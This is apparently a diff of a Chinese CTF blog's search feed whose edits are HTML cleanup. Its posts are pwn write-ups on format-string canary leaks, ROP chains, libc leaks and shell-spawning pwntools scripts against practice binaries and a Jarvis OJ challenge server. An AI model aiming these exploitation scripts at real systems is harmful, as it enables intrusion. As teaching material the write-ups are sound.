    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
+<span class="token punctuation">}</span></code></pre>
 </blockquote>
 <p>俗话说的好..最危险的漏洞其实是人..格式化字符串漏洞的出现就是因为某些懒人程序员 在使用printf函数不规范造成的 </p>
 <p>正常来说 printf函数的使用方法是 <code>printf("格式化字符串",变量)</code> 但是如果程序员懒得写格式化字符串 直接写变量的话 程序也是可以正常运行的 没有什么太大的问题 但是当 输入变量可控和一个懒人程序员遇到一起 擦出爱情的火花 就会造成以下这种结果</p>
-<p><img src="https://ftp.bmp.ovh/imgs/2019/12/8cb6b8c99f50e4da.png" alt=""></p>
+<p><img src="https://ftp.bmp.ovh/imgs/2019/12/8cb6b8c99f50e4da.png" alt></p>
 <p>哦吼…明明用户输入的是一串%p 但是为什么输出的是一堆十六进制数据??这就是格式化字符串漏洞造成的结果 </p>
 <p>我们可以使用动态调试 将程序载入GDB 具体的来看下 这一连串的十六进制数据到底是个什么玩意 </p>
-<p><img src="https://ftp.bmp.ovh/imgs/2019/12/5887ce81ff381f29.png" alt=""></p>
+<p><img src="https://ftp.bmp.ovh/imgs/2019/12/5887ce81ff381f29.png" alt></p>
 <p>通过动态调试 我们可以惊奇的发现…这些十六进制的数据 都是我们输入字符以下栈内的数据 粗略一想好像单单能拿到栈内的数据好像没什么用 但是请注意一点 只要单单能拿到栈内的数据 就已经可以绕过栈溢出的天敌——Canary保护</p>
 <h2 id="格式化字符串漏洞绕过Canary保护"><a href="#格式化字符串漏洞绕过Canary保护" class="headerlink" title="格式化字符串漏洞绕过Canary保护"></a>格式化字符串漏洞绕过Canary保护</h2><blockquote>
 <p>首先给出本模块的样例</p>
@@ -1210,11 +1378,11 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   
-<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>unistd<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
+<span class="token punctuation">}</span></code></pre>
 <p>编译时 请关闭PIE保护</p>
 </blockquote>
 <p>检查保护发现除了PIE之外保护都有 我们可以通过测试偏移发现 关于格式化字符串本身的偏移是6</p>
-<p><img src="https://ftp.bmp.ovh/imgs/2019/12/89ea68a9e780454e.png" alt=""></p>
+<p><img src="https://ftp.bmp.ovh/imgs/2019/12/89ea68a9e780454e.png" alt></p>
 <p>通过GDB和IDA配合调试 发现在栈中我们的输入的格式化字符串跟Canary值之间的偏移是152个字节 转化过来就是19个参数 也就是说 如果我们输入的格式化字符串是<code>%19$p</code> 程序输出的就是Canary的值 然后发现程序有一个 <code>read(0,a,0x200)</code> 此处存在栈溢出</p>
 <p>那么我们在已经获得了Canary值的情况下就可以随意的进行栈溢出 将返回地址改为shell函数的地址 这样就能Getshell了</p>
 <p>实现脚本如下</p>
@@ -1231,7 +1399,7 @@ sh<span class="token punctuation">.</span>sendline<span class="token punctuation
 
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>运行即可 Getshell</p>
-<p><img src="https://ftp.bmp.ovh/imgs/2019/12/aec1de95faffd1a6.png" alt=""></p>
+<p><img src="https://ftp.bmp.ovh/imgs/2019/12/aec1de95faffd1a6.png" alt></p>
 <p>但是利用格式化绕过Canary保护只有这一种办法么?? 要知道 根据格式化字符串的不同 程序是可以做出不同的响应的 其中最为重要的就是<code>%n</code><br>这个格式化字符串是可以将一个指定地址的值更改为 他之前的字符数</p>
 <p>举例来说 <code>1324%n</code> 就是将值改为4</p>
 <p>那么我们或许根本就不需要栈溢出就可以更改返回地址了???</p>
@@ -1281,14 +1449,14 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
   <span class="token punctuation">}</span>
   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 
-<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>unistd<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
+<span class="token punctuation">}</span></code></pre>
 <p>编译请关闭PIE保护</p>
 </blockquote>
 <p>因为格式化字符串中有一个<code>%n</code>的东西 所以这个漏洞的地位就直接上升了一个档次 也就是无视栈不可执行和栈溢出保护 而直接修改返回地址</p>
 <p>同上个模块一样 首先我们还是要算出格式化字符串相对于返回地址 在栈中的偏移 首先可以通过程序直接测出程序内部格式化字符串的偏移8个参数</p>
 <p>首先需要明确一点的是 如果需要修改返回地址 就需要获得起码一个指向返回地址的指针 听起来可能有点绕 换种说法来讲就是 需要一个地址 那个地址里存放的是返回地址的值(也就是返回地址的老家23333) </p>
 <p>那么通过动态调试 我们发现有一个指针</p>
-<p><img src="https://ftp.bmp.ovh/imgs/2019/12/719cfd99297b2f41.png" alt=""></p>
+<p><img src="https://ftp.bmp.ovh/imgs/2019/12/719cfd99297b2f41.png" alt></p>
 <p>该指针指向的地址一直和返回地址的差0xE0 也就是说 我们可以先获取到该指针的值 然后减去0XE0 就可以得到指向返回地址的指针 然后通过该指针就可以修改返回地址的值了</p>
 <blockquote>
 <p>这里介绍一个pwntools很好用的模块 <code>fmtstr_payload</code></p>
@@ -1351,7 +1519,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -1371,14 +1539,14 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <entry>
       <title><![CDATA[NJUPT_CTF-WP]]></title>
       <url>/2019/11/28/njupt-ctf/</url>
-      <content type="html"><![CDATA[<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>提示 <code>Do you know pwntools?</code> 直接用pwntools 连上去就出flag</p>
-<p><img src="https://img02.sogoucdn.com/app/a/100520146/bcfa23648c0d59da32c0ba8b6cdabb1b" alt=""></p>
+      <content type="html"><![CDATA[<html><head></head><body><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>提示 <code>Do you know pwntools?</code> 直接用pwntools 连上去就出flag</p>
+<p><img src="https://img02.sogoucdn.com/app/a/100520146/bcfa23648c0d59da32c0ba8b6cdabb1b" alt></p>
 <h2 id="pwn-me-100-years-I"><a href="#pwn-me-100-years-I" class="headerlink" title="pwn_me_100_years (I)"></a>pwn_me_100_years (I)</h2><p>查保护</p>
-<p><img src="https://img02.sogoucdn.com/app/a/100520146/8b83de84ae8ec07b01a461bfc7746ceb" alt=""></p>
+<p><img src="https://img02.sogoucdn.com/app/a/100520146/8b83de84ae8ec07b01a461bfc7746ceb" alt></p>
 <p>拖入IDA </p>
-<p><img src="https://img02.sogoucdn.com/app/a/100520146/fd12eb6966aaf380b23c0e35c74436b3" alt=""></p>
+<p><img src="https://img02.sogoucdn.com/app/a/100520146/fd12eb6966aaf380b23c0e35c74436b3" alt></p>
 <p>简单解释下逻辑 就是当0x6010c0地址处的值等于0x66666666时 程序将打开一个shell 程序前面只有一个read 双击s1 发现s1是和0x6010c0相邻 </p>
-<p><img src="https://img02.sogoucdn.com/app/a/100520146/b545d90d71a0962f0619621cd50ffbe2" alt=""></p>
+<p><img src="https://img02.sogoucdn.com/app/a/100520146/b545d90d71a0962f0619621cd50ffbe2" alt></p>
 <p>可以观察到 s1到达目标0x6010c0只差0x10 而read可以读进0x20个字符 则我们可以覆盖过去 但是程序将我们输入的字符和<code>yes</code>进行了比较 如果等于yes 才能程序才会继续进行判断 但是strcmp函数判断字符串的方式是通过字符串结尾的\x00 来判断字符串是否结尾的 那手动输入一个\x00 让strcmp认为字符串结束就可以绕过了</p>
 <p>脚本如下</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -1391,11 +1559,11 @@ payload<span class="token operator">=</span><span class="token string">'yes'</sp
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>运行即可getshell</p>
-<p><img src="https://img04.sogoucdn.com/app/a/100520146/a10722822f0bbdb83531695cc2cb811f" alt=""></p>
+<p><img src="https://img04.sogoucdn.com/app/a/100520146/a10722822f0bbdb83531695cc2cb811f" alt></p>
 <h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm_up"></a>warm_up</h2><p>查保护</p>
-<p><img src="https://img04.sogoucdn.com/app/a/100520146/638a24772c7f4f3ef3f36972c873eaca" alt=""></p>
+<p><img src="https://img04.sogoucdn.com/app/a/100520146/638a24772c7f4f3ef3f36972c873eaca" alt></p>
 <p>载入IDA 发现程序加了白名单 禁止掉了execve 那肯定就不能开个shell了 只能使用orw[open,read,write] 来读取flag了 </p>
-<p><img src="https://img03.sogoucdn.com/app/a/100520146/68b021fd58cf57e6109016f479acacef" alt=""></p>
+<p><img src="https://img03.sogoucdn.com/app/a/100520146/68b021fd58cf57e6109016f479acacef" alt></p>
 <p>这里明显存在栈溢出 那么就是正常rop的流程 肯定还是要先泄漏出来canary的值和libc版本 然后使用mprotect函数 使bss段可执行 再将open(“./flag”) read(3,bss_addr,0x100) write(1,bss_addr,0x100) 写到bss段上 最后跳转执行即可 脚本如下</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span>  pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
@@ -1479,7 +1647,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -1499,7 +1667,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <entry>
       <title><![CDATA[ROP技术]]></title>
       <url>/2019/11/16/rop-ji-zhu/</url>
-      <content type="html"><![CDATA[<blockquote>
+      <content type="html"><![CDATA[<html><head></head><body><blockquote>
 <p>学习ROP技术需要略微一点的plt和got表的知识以及汇编层面函数调用的知识</p>
 </blockquote>
 <h2 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h2><p>在编程过程中 有面向过程编程(POP) 有面向对象编程(OOP) 而在PWN中 有一种技术叫做面向返回编程 即ROP </p>
@@ -1515,12 +1683,12 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>(作用同上 但是这个ROP链适用于64位程序)</p>
 <p>其中的函数名是可以换的 直接替换成适合的函数即可</p>
 <h2 id="样例-攻防世界-进阶区-pwn100"><a href="#样例-攻防世界-进阶区-pwn100" class="headerlink" title="样例(攻防世界-进阶区-pwn100)"></a>样例(攻防世界-进阶区-pwn100)</h2><p>首先万年雷同起手式</p>
-<p><img src="https://ae01.alicdn.com/kf/H565de1b3314e48eca5841b813a4afb464.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H565de1b3314e48eca5841b813a4afb464.png" alt></p>
 <p>拖入IDA 发现程序主要的逻辑就是读入200个字符 然后结束 发现在读入时存在栈溢出 程序仅执行一次且程序函数表没有system函数 此时考虑使用ROP</p>
-<p><img src="https://ae01.alicdn.com/kf/H1fdd1e71e864469287ddbf46bf091747K.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H1fdd1e71e864469287ddbf46bf091747K.png" alt></p>
 <p>通过观察函数表 发现程序使用过puts函数 决定使用puts函数作为基础 使用ROP技术</p>
 <p>首先因为是64位程序 我们需要将参数puts_got给整到寄存器RDI中 这样才能正常调用 这是我使用的是ROPgadget 这个工具来查找适合的函数 </p>
-<p><img src="https://ae01.alicdn.com/kf/H7408932667ab43bda5577052e025cb3at.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H7408932667ab43bda5577052e025cb3at.png" alt></p>
 <p>确定0x400763存在我们需要的函数 那么我们就可以直接构造我们需要的ROP链了</p>
 <blockquote>
 <p>填充字符+pop_rdi_addr+puts_got+puts_plt+main_addr</p>
@@ -1565,12 +1733,12 @@ sh<span class="token punctuation">.</span>sendline<span class="token punctuation
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 <p>执行即可getshell</p>
-<p><img src="https://ae01.alicdn.com/kf/H26596ab1eb714c7cb3f943d21e85d677o.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H26596ab1eb714c7cb3f943d21e85d677o.png" alt></p>
 <h2 id="样例-攻防世界-进阶区-welpwn"><a href="#样例-攻防世界-进阶区-welpwn" class="headerlink" title="样例(攻防世界-进阶区-welpwn)"></a>样例(攻防世界-进阶区-welpwn)</h2><blockquote>
 <p>第一次看见这个标题的时候以为是pwn的入门题..果然被骗了！</p>
 </blockquote>
 <p>老样子 先正常起手式</p>
-<p><img src="https://ae01.alicdn.com/kf/Hf1a8a25607ca499fae38283b4a04d3dfO.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hf1a8a25607ca499fae38283b4a04d3dfO.png" alt></p>
 <p>载入IDA 发现特别迷幻的地方 似乎整个程序都没有洞… 尝试动态调试下吧</p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -1590,7 +1758,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -1610,7 +1778,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <entry>
       <title><![CDATA[如何泄漏PWN中的一些信息]]></title>
       <url>/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/</url>
-      <content type="html"><![CDATA[<h2 id="敏感函数"><a href="#敏感函数" class="headerlink" title="敏感函数"></a>敏感函数</h2><p>一般来说 所有有向屏幕输出功能的函数都有泄漏Libc的可能 但是主要用到还是以下几个函数</p>
+      <content type="html"><![CDATA[<html><head></head><body><h2 id="敏感函数"><a href="#敏感函数" class="headerlink" title="敏感函数"></a>敏感函数</h2><p>一般来说 所有有向屏幕输出功能的函数都有泄漏Libc的可能 但是主要用到还是以下几个函数</p>
 <h3 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h3><p>puts函数嘛…我们的老常客..大部分漏洞都会用到它 需要注意的是 puts的截断标准是遇到 <strong>\0</strong> 即从某个地址开始一直输出 直到遇到\0为止</p>
 <h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>write函数也是大部分泄漏时利用的函数</p>
 <p>函数原型: write(int fd,const void *buf,size_t size)</p>
@@ -1639,12 +1807,12 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             i<span class="token operator">--</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
       <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
+<span class="token punctuation">}</span></code></pre>
 <blockquote>
 <p>编译指令: gcc -no-pie 输出文件名 源码名</p>
 </blockquote>
 <p>首先使用checksec查看一下保护</p>
-<p><img src="https://ae01.alicdn.com/kf/Ha848a116c2fa44208a905701b54e09bbl.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Ha848a116c2fa44208a905701b54e09bbl.png" alt></p>
 <p>确认和预先料想的一样 开启了Canary保护 载入IDA</p>
 <p>通过观察流程图 我们可以发现 在程序最后会校验 var_8 这个变量 如果变量和预先值不同 就触发 stack_chk_fail函数 至于这个函数的功能…看看名字就知道了啊喂… 通过这个我们就能了解 var_8变量储存的就是我们Canary值 要想通过栈溢出直接跳转到 sys函数拿到shell 就需要先泄漏出来它 </p>
 <p>通过阅读IDA的代码和栈图 我们可以明确得知程序的流程 main函数内部将会执行两次 且我们的输入是可以溢出到Canary值的 </p>
@@ -1698,15 +1866,15 @@ constchar<span class="token operator">*</span>msg<span class="token punctuation"
 <p>可以通过函数明确了解到 如果我们能控制argv[0]指针的位置 那我们就能输出任意值<br>而控制argv[0]的位置通常有两种方式 一种是暴力覆盖 因为其为一个变量 且通常为文件名 那么他就一定在栈上 通过栈溢出 直接覆盖全部栈为我们想要的地址 就一定会将argv[0]指针的值覆盖为我们想要的 还有一种就是计算偏移 因为其值为文件名 观察栈指定覆盖即可</p>
 <h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>这里使用 Jarvis OJ 的题目Smashes 进行演示</p>
 <p>首先checksec 查看保护</p>
-<p><img src="https://ae01.alicdn.com/kf/Hbd06c905aa8946aa988f134913022d9bB.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hbd06c905aa8946aa988f134913022d9bB.png" alt></p>
 <p>发现开有Canary保护 不能直接进行ROP 载入IDA 发现没有任何能用于输出flag的方式 但是发现一个奇怪的字符串</p>
-<p><img src="https://ae01.alicdn.com/kf/Hedb1c5785ce645b7820b506d8ff69021X.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hedb1c5785ce645b7820b506d8ff69021X.png" alt></p>
 <p>也就是说flag的地址就是这个地方 如果写出脚本能够输出这个位置的值 就能得到flag</p>
 <p>联系到SSP leak 我们可以故意触发stack_chk_fail函数 然后将指针指向这个地址就能利用报错信息输出flag了</p>
 <p>但是看到主函数的最后一句 发现这个位置的flag会在主函数返回之前就清除掉 这个时候就需要用到ELF的重映射了</p>
-<p><img src="https://ae01.alicdn.com/kf/Hc3145c65c7a74b149a1db1c3b888bf83f.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hc3145c65c7a74b149a1db1c3b888bf83f.png" alt></p>
 <p>我们使用gdb 看看程序是否有flag的重映射</p>
-<p><img src="https://ae01.alicdn.com/kf/H4a5f879530e04a619be0925cdc11a758s.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H4a5f879530e04a619be0925cdc11a758s.png" alt></p>
 <p>发现在0x400d20处还映射的有flag 那么我们直接将0x400d20覆盖满整个栈即可</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'pwn.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9877</span><span class="token punctuation">)</span>
@@ -1717,7 +1885,7 @@ r<span class="token punctuation">.</span>sendline<span class="token punctuation"
 
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>运行脚本即可</p>
-<p><img src="https://ae01.alicdn.com/kf/Ha99e3eabb7d447afa66ab934d84f2b12X.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Ha99e3eabb7d447afa66ab934d84f2b12X.png" alt></p>
 <h2 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h2><blockquote>
 <p>这里先科普下libc是什么 以及泄漏libc有什么用</p>
 <p>可以直接将libc理解为是C的函数库 但是里面存的不是函数的具体地址 而是函数相对于libc基地址的偏移 </p>
@@ -1757,7 +1925,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token punctuation">}</span>
       <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
+<span class="token punctuation">}</span></code></pre>
 <blockquote>
 <p>编译指令 gcc -no-pie 文件名 -o 源码名</p>
 </blockquote>
@@ -1771,32 +1939,32 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 </blockquote>
 <p>有了以上条件 基本思路也就可以形成了<br>首先是需要去泄漏出来puts函数的真实地址 然后再利用给出的libc文件 计算出libc的基地址 最后通过栈溢出 拿到shell </p>
 <p>当然在有Canary保护的情况下首先还是应该泄漏Canary的值 </p>
-<pre class=" language-python"><code class="language-python">sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<pre class=" language-python">sh.recvuntil("><code class="language-python">sh.recvuntil(">> ")
+sh.sendline("1")
+payload='a'*0x68
+sh.sendline(payload)
 
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span>
-canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x0a</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+sh.recvuntil(">> ")
+sh.sendline("2")
+sh.recvuntil('a'*0x68)
+canary=u64(sh.recv(8))-0x0a
+log.info("canary:"+hex(canary))</code></pre>
 <p>这样 就可以利用栈溢出 覆盖掉Canary的\x00 然后成功泄漏出Canary值 </p>
-<p><img src="https://ae01.alicdn.com/kf/H0a7101de549443aba47e08b1de23b8055.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H0a7101de549443aba47e08b1de23b8055.png" alt></p>
 <p>在有了Canary值后 就可以肆无忌惮的进行栈溢出 不用怕chk_stack_fail了… 那么下一步就是为了泄漏libc基地址做准备 回看一下程序源码 发现puts函数和read函数是执行过的 可以根据个人喜好自己泄漏相对于的真实地址 这里我选择的是puts地址 </p>
-<pre class=" language-python"><code class="language-python">sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
-payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+<pre class=" language-python">sh.recvuntil("><code class="language-python">sh.recvuntil(">> ")
+sh.sendline("1")
+payload2='a'*0x68+p64(canary)+'a'*0x8+p64(pop_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
+sh.sendline(payload2)
 
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+sh.recvuntil(">> ")
+sh.sendline('3')
 
 
 
-puts_got<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
-<p><img src="https://ae01.alicdn.com/kf/Hc2e83934915d427b915f9437089a01b0u.png" alt=""></p>
+puts_got=u64(sh.recv(6).ljust(8,'\x00'))
+log.info("puts_got:"+hex(puts_got))</code></pre>
+<p><img src="https://ae01.alicdn.com/kf/Hc2e83934915d427b915f9437089a01b0u.png" alt></p>
 <p>剩下就简单多了 计算基地址 计算system函数偏移 和/bin/sh偏移 然后调用即可</p>
 <pre class=" language-python"><code class="language-python">libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
 log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
@@ -1896,7 +2064,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -1916,16 +2084,16 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <entry>
       <title><![CDATA[UNCTF-WP]]></title>
       <url>/2019/10/26/unctf-wp/</url>
-      <content type="html"><![CDATA[<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><p><img src="https://ae01.alicdn.com/kf/H177f67923b764acd81d41f273e48f59bR.png" alt=""></p>
+      <content type="html"><![CDATA[<html><head></head><body><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><p><img src="https://ae01.alicdn.com/kf/H177f67923b764acd81d41f273e48f59bR.png" alt></p>
 <p>有壳 且没有检测出具体壳的种类 使用ESP定律手动脱壳 </p>
-<p><img src="https://ae01.alicdn.com/kf/H385b1b23dcc94510bdadae87f250ec19m.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H385b1b23dcc94510bdadae87f250ec19m.png" alt></p>
 <p>已经脱掉壳了 载入dbg动态调试 单步跟几部之后发现在栈中存有flag</p>
-<p><img src="https://ae01.alicdn.com/kf/H951b18e9b2884ed586e617c995e78402r.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H951b18e9b2884ed586e617c995e78402r.png" alt></p>
 <p>得到flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p>
 <h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><p>拖入IDA 看算法 在encode函数内发现主要算法 </p>
-<p><img src="https://ae01.alicdn.com/kf/H2be8210dda1a4d9cbbb77b0c674efdcam.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H2be8210dda1a4d9cbbb77b0c674efdcam.png" alt></p>
 <p>同时在主函数结尾发现strcmp函数 推测是比较加密后的flag</p>
-<p><img src="https://ae01.alicdn.com/kf/He8a1df62631d402290b70f623bf887f0p.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/He8a1df62631d402290b70f623bf887f0p.png" alt></p>
 <p>写出逆算法即可</p>
 <pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
 using namespace std<span class="token punctuation">;</span>
@@ -1940,11 +2108,21 @@ using namespace std<span class="token punctuation">;</span>
     <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
     <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0x12</span><span class="token punctuation">;</span>
     cin<span class="token operator">>></span>a2<span class="token punctuation">;</span>
